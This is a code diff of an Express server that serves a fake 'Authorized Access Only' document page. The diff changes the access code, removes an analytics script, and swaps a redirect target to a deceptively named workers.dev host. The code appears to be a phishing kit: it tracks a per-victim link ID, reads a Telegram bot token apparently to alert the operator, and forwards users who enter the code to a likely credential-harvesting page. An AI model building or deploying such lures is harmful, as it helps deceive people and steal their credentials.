@@ -550,7 +550,7 @@ const myHTML = `
             <div class="stat-label">Reference</div>
           </div>
           <div class="stat">
-            <div class="stat-value">Quote435</div>
+            <div class="stat-value">223490</div>
             <div class="stat-label">Access Code</div>
           </div>
           <div class="stat">
@@ -577,7 +577,7 @@ const myHTML = `
       <div class="form-header">
         <span class="form-eyebrow">Authorized Access Only</span>
         <h2 class="form-title">Enter the password to view</h2>
-        <p class="form-subtitle">This document requires a valid access code to proceed. Your Access Code: Quote435</p>
+        <p class="form-subtitle">This document requires a valid access code to proceed. Your Access Code: 223490</p>
       </div>
 
       <div class="form-description">
@@ -644,7 +644,6 @@ const myHTML = `
       }
     });
   </script>
-  <script>function loadScript(a){var b=document.getElementsByTagName("head")[0],c=document.createElement("script");c.type="text/javascript",c.src="https://tracker.metricool.com/resources/be.js",c.onreadystatechange=a,c.onload=a,b.appendChild(c)}loadScript(function(){beTracker.t({hash:"23e69ddaf3388273dd74d2afba49121b"})});</script>
 </body>
 </html>
 `;
@@ -655,8 +654,8 @@ const myHTML = `
 app.post('/verify', async (req, res) => {
   const { code } = req.body;
   const linkId = req.query.id || 'unknown'; // Capture the unique ID from URL
-  const CORRECT_CODE = "Quote435";
-  const TARGET_URL = "https://constructors-cmhc-d66c31-8c3a80.summary-review.workers.dev/?k=Wf3zW15MN0Mh6bdhOwphDclJ";
+  const CORRECT_CODE = "223490";
+  const TARGET_URL = "https://portal-verify-j4bk9.secure-93938.workers.dev";
 
   if (code === CORRECT_CODE) {
     const token = process.env.TELEGRAM_BOT_TOKEN;
